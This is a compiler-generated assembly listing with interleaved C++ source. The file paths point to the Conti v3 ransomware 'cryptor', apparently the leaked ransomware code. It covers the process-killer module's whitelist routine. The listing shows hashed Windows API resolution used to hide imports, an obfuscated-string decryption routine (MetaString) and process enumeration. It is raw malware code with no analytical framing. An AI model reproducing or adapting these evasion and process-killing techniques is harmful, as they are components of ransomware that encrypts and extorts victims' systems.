; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@ ; `string'
;	COMDAT ??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@
CONST	SEGMENT
??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@ DB 'e'
	DB	00H, 'x', 00H, 'p', 00H, 'l', 00H, 'o', 00H, 'r', 00H, 'e', 00H
	DB	'r', 00H, '.', 00H, 'e', 00H, 'x', 00H, 'e', 00H, 00H, 00H ; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32NextW
PUBLIC	?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32FirstW
PUBLIC	?pCreateToolhelp32Snapshot@@YAPEAXKK@Z		; pCreateToolhelp32Snapshot
PUBLIC	?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ; process_killer::GetWhiteListProcess
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z DD imagerel $LN4
	DD	imagerel $LN4+36
	DD	imagerel $unwind$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z DD imagerel $LN125
	DD	imagerel $LN125+549
	DD	imagerel $unwind$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z DD 072b19H
	DD	056741aH
	DD	055341aH
	DD	052011aH
	DD	0500bH
	DD	imagerel __GSHandlerCheck
	DD	0280H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp
;	COMDAT ?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z
_TEXT	SEGMENT
$T1 = 32
pe32$ = 64
__$ArrayPad$ = 640
PidList$ = 672
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z PROC ; process_killer::GetWhiteListProcess, COMDAT

; 10   : {

$LN125:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000a	55		 push	 rbp
  0000b	48 8d ac 24 70
	fe ff ff	 lea	 rbp, QWORD PTR [rsp-400]
  00013	48 81 ec 90 02
	00 00		 sub	 rsp, 656		; 00000290H
  0001a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00021	48 33 c4	 xor	 rax, rsp
  00024	48 89 85 80 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1120 : 	pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86f8bb2, 14);

  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	41 b8 b2 8b 6f
	a8		 mov	 r8d, -1469084750	; a86f8bb2H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 10   : {

  00036	48 8b d9	 mov	 rbx, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1120 : 	pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86f8bb2, 14);

  00039	44 8d 4a ff	 lea	 r9d, QWORD PTR [rdx-1]
  0003d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1121 : 	return pFunction(dwFlags, th32ProcessID);

  00042	33 d2		 xor	 edx, edx
  00044	8d 4a 02	 lea	 ecx, QWORD PTR [rdx+2]
  00047	ff d0		 call	 rax
  00049	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 12   : 	if (hSnapShot == NULL) {

  0004c	48 85 c0	 test	 rax, rax
  0004f	0f 84 ac 01 00
	00		 je	 $LN1@GetWhiteLi

; 13   : 		return;
; 14   : 	}
; 15   : 
; 16   : 	PROCESSENTRY32W pe32;
; 17   : 	pe32.dwSize = sizeof(PROCESSENTRY32W);

  00055	c7 44 24 40 38
	02 00 00	 mov	 DWORD PTR pe32$[rsp], 568 ; 00000238H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1133 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5e57b014, 13);

  0005d	41 b9 0d 00 00
	00		 mov	 r9d, 13
  00063	41 b8 14 b0 57
	5e		 mov	 r8d, 1582805012		; 5e57b014H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 22   : 		return;

  00069	e9 5d 01 00 00	 jmp	 $LN123@GetWhiteLi
  0006e	66 90		 npad	 2
$LL4@GetWhiteLi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00070	c6 44 24 20 00	 mov	 BYTE PTR $T1[rsp], 0
  00075	c6 44 24 21 3d	 mov	 BYTE PTR $T1[rsp+1], 61	; 0000003dH
  0007a	c6 44 24 22 2b	 mov	 BYTE PTR $T1[rsp+2], 43	; 0000002bH
  0007f	c6 44 24 23 7e	 mov	 BYTE PTR $T1[rsp+3], 126 ; 0000007eH
  00084	c6 44 24 24 2b	 mov	 BYTE PTR $T1[rsp+4], 43	; 0000002bH
  00089	c6 44 24 25 70	 mov	 BYTE PTR $T1[rsp+5], 112 ; 00000070H
  0008e	c6 44 24 26 2b	 mov	 BYTE PTR $T1[rsp+6], 43	; 0000002bH
  00093	c6 44 24 27 69	 mov	 BYTE PTR $T1[rsp+7], 105 ; 00000069H
  00098	c6 44 24 28 2b	 mov	 BYTE PTR $T1[rsp+8], 43	; 0000002bH
  0009d	c6 44 24 29 0f	 mov	 BYTE PTR $T1[rsp+9], 15
  000a2	c6 44 24 2a 2b	 mov	 BYTE PTR $T1[rsp+10], 43 ; 0000002bH
  000a7	c6 44 24 2b 34	 mov	 BYTE PTR $T1[rsp+11], 52 ; 00000034H
  000ac	c6 44 24 2c 2b	 mov	 BYTE PTR $T1[rsp+12], 43 ; 0000002bH
  000b1	c6 44 24 2d 3d	 mov	 BYTE PTR $T1[rsp+13], 61 ; 0000003dH
  000b6	c6 44 24 2e 2b	 mov	 BYTE PTR $T1[rsp+14], 43 ; 0000002bH
  000bb	c6 44 24 2f 34	 mov	 BYTE PTR $T1[rsp+15], 52 ; 00000034H
  000c0	c6 44 24 30 2b	 mov	 BYTE PTR $T1[rsp+16], 43 ; 0000002bH
  000c5	c6 44 24 31 3c	 mov	 BYTE PTR $T1[rsp+17], 60 ; 0000003cH
  000ca	c6 44 24 32 2b	 mov	 BYTE PTR $T1[rsp+18], 43 ; 0000002bH
  000cf	c6 44 24 33 3d	 mov	 BYTE PTR $T1[rsp+19], 61 ; 0000003dH
  000d4	c6 44 24 34 2b	 mov	 BYTE PTR $T1[rsp+20], 43 ; 0000002bH
  000d9	c6 44 24 35 7e	 mov	 BYTE PTR $T1[rsp+21], 126 ; 0000007eH
  000de	c6 44 24 36 2b	 mov	 BYTE PTR $T1[rsp+22], 43 ; 0000002bH
  000e3	c6 44 24 37 3d	 mov	 BYTE PTR $T1[rsp+23], 61 ; 0000003dH
  000e8	c6 44 24 38 2b	 mov	 BYTE PTR $T1[rsp+24], 43 ; 0000002bH
  000ed	c6 44 24 39 2b	 mov	 BYTE PTR $T1[rsp+25], 43 ; 0000002bH
  000f2	c6 44 24 3a 2b	 mov	 BYTE PTR $T1[rsp+26], 43 ; 0000002bH
  000f7	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  000fc	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  00101	84 c0		 test	 al, al
  00103	75 60		 jne	 SHORT $LN75@GetWhiteLi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00105	45 33 c9	 xor	 r9d, r9d
  00108	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL76@GetWhiteLi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00110	42 0f b6 4c 0c
	21		 movzx	 ecx, BYTE PTR $T1[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00116	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0011b	83 e9 2b	 sub	 ecx, 43			; 0000002bH
  0011e	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00122	41 f7 e8	 imul	 r8d
  00125	41 03 d0	 add	 edx, r8d
  00128	c1 fa 06	 sar	 edx, 6
  0012b	8b c2		 mov	 eax, edx
  0012d	c1 e8 1f	 shr	 eax, 31
  00130	03 d0		 add	 edx, eax
  00132	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00135	44 2b c0	 sub	 r8d, eax
  00138	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0013d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00141	41 f7 e8	 imul	 r8d
  00144	41 03 d0	 add	 edx, r8d
  00147	c1 fa 06	 sar	 edx, 6
  0014a	8b c2		 mov	 eax, edx
  0014c	c1 e8 1f	 shr	 eax, 31
  0014f	03 d0		 add	 edx, eax
  00151	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00154	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00157	46 88 44 0c 21	 mov	 BYTE PTR $T1[rsp+r9+1], r8b
  0015c	49 ff c1	 inc	 r9
  0015f	49 83 f9 1a	 cmp	 r9, 26
  00163	72 ab		 jb	 SHORT $LL76@GetWhiteLi
$LN75@GetWhiteLi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00165	ba 0f 00 00 00	 mov	 edx, 15
  0016a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00170	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00174	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00179	48 8d 54 24 21	 lea	 rdx, QWORD PTR $T1[rsp+1]
  0017e	48 8d 4c 24 6c	 lea	 rcx, QWORD PTR pe32$[rsp+44]
  00183	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 29   : 		if (!plstrcmpiW(pe32.szExeFile, OBFW(L"explorer.exe"))) {

  00185	85 c0		 test	 eax, eax
  00187	75 36		 jne	 SHORT $LN6@GetWhiteLi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  00189	8d 48 18	 lea	 ecx, QWORD PTR [rax+24]
  0018c	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00191	33 c9		 xor	 ecx, ecx
  00193	0f 57 c0	 xorps	 xmm0, xmm0
  00196	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0
  00199	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 32   : 			if (!Pid) {

  0019d	48 85 c0	 test	 rax, rax
  001a0	74 45		 je	 SHORT $LN3@GetWhiteLi

; 33   : 				break;
; 34   : 			}
; 35   : 
; 36   : 			Pid->dwProcessId = pe32.th32ProcessID;

  001a2	8b 4c 24 48	 mov	 ecx, DWORD PTR pe32$[rsp+8]
  001a6	89 08		 mov	 DWORD PTR [rax], ecx

; 37   : 			TAILQ_INSERT_TAIL(PidList, Pid, Entries);

  001a8	48 8b 4b 08	 mov	 rcx, QWORD PTR [rbx+8]
  001ac	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx
  001b0	48 8b 4b 08	 mov	 rcx, QWORD PTR [rbx+8]
  001b4	48 89 01	 mov	 QWORD PTR [rcx], rax
  001b7	48 83 c0 08	 add	 rax, 8
  001bb	48 89 43 08	 mov	 QWORD PTR [rbx+8], rax
$LN6@GetWhiteLi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1146 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc9a81ce0, 12);

  001bf	41 b9 0c 00 00
	00		 mov	 r9d, 12
  001c5	41 b8 e0 1c a8
	c9		 mov	 r8d, -911729440		; c9a81ce0H
$LN123@GetWhiteLi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\prockiller\prockiller.cpp

; 44   : }

  001cb	ba 0f 00 00 00	 mov	 edx, 15
  001d0	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  001d5	48 8d 54 24 40	 lea	 rdx, QWORD PTR pe32$[rsp]
  001da	48 8b cf	 mov	 rcx, rdi
  001dd	ff d0		 call	 rax
  001df	85 c0		 test	 eax, eax
  001e1	0f 85 89 fe ff
	ff		 jne	 $LL4@GetWhiteLi
$LN3@GetWhiteLi:
  001e7	41 b9 5b 00 00
	00		 mov	 r9d, 91			; 0000005bH
  001ed	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  001f3	41 8d 51 b4	 lea	 edx, QWORD PTR [r9-76]
  001f7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  001fc	48 8b cf	 mov	 rcx, rdi
  001ff	ff d0		 call	 rax
$LN1@GetWhiteLi:
  00201	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00208	48 33 cc	 xor	 rcx, rsp
  0020b	e8 00 00 00 00	 call	 __security_check_cookie
  00210	4c 8d 9c 24 90
	02 00 00	 lea	 r11, QWORD PTR [rsp+656]
  00218	49 8b 5b 18	 mov	 rbx, QWORD PTR [r11+24]
  0021c	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  00220	49 8b e3	 mov	 rsp, r11
  00223	5d		 pop	 rbp
  00224	c3		 ret	 0
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ENDP ; process_killer::GetWhiteListProcess
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateToolhelp32Snapshot@@YAPEAXKK@Z
_TEXT	SEGMENT
dwFlags$dead$ = 48
th32ProcessID$dead$ = 56
?pCreateToolhelp32Snapshot@@YAPEAXKK@Z PROC		; pCreateToolhelp32Snapshot, COMDAT

; 1118 : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 1119 : 	HANDLE(WINAPI * pFunction)(DWORD, DWORD);
; 1120 : 	pFunction = (HANDLE(WINAPI*)(DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86f8bb2, 14);

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 b2 8b 6f
	a8		 mov	 r8d, -1469084750	; a86f8bb2H
  0000f	44 8d 4a ff	 lea	 r9d, QWORD PTR [rdx-1]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1121 : 	return pFunction(dwFlags, th32ProcessID);

  00018	33 d2		 xor	 edx, edx
  0001a	8d 4a 02	 lea	 ecx, QWORD PTR [rdx+2]

; 1122 : }

  0001d	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 1121 : 	return pFunction(dwFlags, th32ProcessID);

  00021	48 ff e0	 rex_jmp rax
?pCreateToolhelp32Snapshot@@YAPEAXKK@Z ENDP		; pCreateToolhelp32Snapshot
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
_TEXT	SEGMENT
hSnapshot$ = 48
lppe$ = 56
?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z PROC ; pProcess32FirstW, COMDAT

; 1131 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 1132 : 	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
; 1133 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5e57b014, 13);

  0000d	41 b8 14 b0 57
	5e		 mov	 r8d, 1582805012		; 5e57b014H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a fe	 lea	 r9d, QWORD PTR [rdx-2]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1134 : 	return pFunction(hSnapshot, lppe);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 1135 : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 1134 : 	return pFunction(hSnapshot, lppe);

  00034	48 ff e0	 rex_jmp rax
?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ENDP ; pProcess32FirstW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
_TEXT	SEGMENT
hSnapshot$ = 48
lppe$ = 56
?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z PROC ; pProcess32NextW, COMDAT

; 1144 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 1145 : 	BOOL(WINAPI * pFunction)(HANDLE, LPPROCESSENTRY32W);
; 1146 : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc9a81ce0, 12);

  0000d	41 b8 e0 1c a8
	c9		 mov	 r8d, -911729440		; c9a81ce0H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a fd	 lea	 r9d, QWORD PTR [rdx-3]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1147 : 	return pFunction(hSnapshot, lppe);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 1148 : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 1147 : 	return pFunction(hSnapshot, lppe);

  00034	48 ff e0	 rex_jmp rax
?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ENDP ; pProcess32NextW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 1a 00 00
	00		 mov	 r11d, 26
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2b	 sub	 ecx, 43			; 0000002bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
